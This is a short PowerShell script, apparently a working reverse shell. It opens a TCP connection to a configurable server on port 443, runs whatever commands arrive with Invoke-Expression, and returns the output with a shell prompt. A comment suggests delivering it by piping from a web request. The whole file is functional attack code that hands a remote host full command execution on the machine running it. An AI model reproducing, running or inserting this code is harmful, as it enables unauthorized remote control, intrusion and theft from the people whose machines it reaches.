# Set the $server variable and pipe from a web-request or whatever for your use case
$port = "443"
$client = New-Object System.Net.Sockets.TcpClient($server, $port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..255|%{0};
$textEncoding = New-Object System.Text.UTF8Encoding; # Initialize the text encoding
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    if(-not [string]::IsNullOrWhiteSpace($data)){ # Make sure $data is not null or empty
        $sendback = (iex $data 2>&1 | Out-String );
        $response = $sendback + 'PS ' + (pwd).Path + '> ';
        if(-not [string]::IsNullOrWhiteSpace($response)){ # Make sure response is not null or empty
            $byteResponse = $textEncoding.GetBytes($response); 
            $stream.Write($byteResponse,0,$byteResponse.Length);
            $stream.Flush();
        }
    }
};
$client.Close();